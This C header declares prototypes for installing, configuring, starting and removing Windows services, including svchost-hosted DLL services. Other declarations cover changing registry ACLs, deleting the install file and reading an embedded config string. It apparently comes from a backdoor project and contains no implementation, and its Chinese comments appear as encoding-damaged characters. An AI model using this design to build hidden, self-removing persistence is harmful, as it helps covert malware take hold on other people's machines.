
#if !defined(AFX_INSTALL_H_INCLUDED)
#define AFX_INSTALL_H_INCLUDED
#include <windows.h>
#include <aclapi.h>
void	DeleteInstallFile(char *lpServiceName);
bool	IsServiceRegExists(char *lpServiceName);
void	ReConfigService(char *lpServiceName);
DWORD	QueryServiceTypeFromRegedit(char *lpServiceName);
void	RemoveService(LPCTSTR lpServiceName);
LPCTSTR FindConfigString(HMODULE hModule, LPCTSTR lpString);
//int		memfind(const char *mem, const char *str, int sizem, int sizes);
BOOL	RegKeySetACL(LPTSTR lpKeyName, DWORD AccessPermissions, ACCESS_MODE AccessMode);

//����:���һ�������Ƿ����
//����ֵ:BOOL
BOOL NtServiceIsExist(LPCTSTR servicename);

//����:����һ���Ѵ��ڷ���,����ڣ�����ظ�ֱ����ɹ�
//����ֵ:UNIT
UINT NtStartService(LPCTSTR lpService);

//����:����һ��ϵͳ����.SERVICE_AUTO_START
//����ֵUINT
UINT NtInstallService(LPCTSTR strServiceName, //��������
					  LPCTSTR strDisplayName, //������ʾ����
					  LPCTSTR strDescription,//��������
					  LPCTSTR strPathName,   //��ִ���ļ���·��
					  LPCTSTR Dependencies,//ָ�������÷���ǰ�����������ķ���������,һ��ΪNULL
					  BOOLEAN KernelDriver, //�Ƿ�װ��������
					  ULONG   StartType		//��������
					  );

//����:���÷����Զ�������
//����ֵ:UINT
void ServiceConfig(LPCTSTR ServiceName);

//����:����һ��svchost�����ķ���,SERVICE_AUTO_START
//����ֵBOOL
BOOL NtInstallSvchostService(LPCTSTR strServiceName, 
							 LPCTSTR strServiceDisp, 
							 LPCTSTR strServiceDesc,
					       LPCTSTR strDllPath);

#endif // !defined(AFX_INSTALL_H_INCLUDED)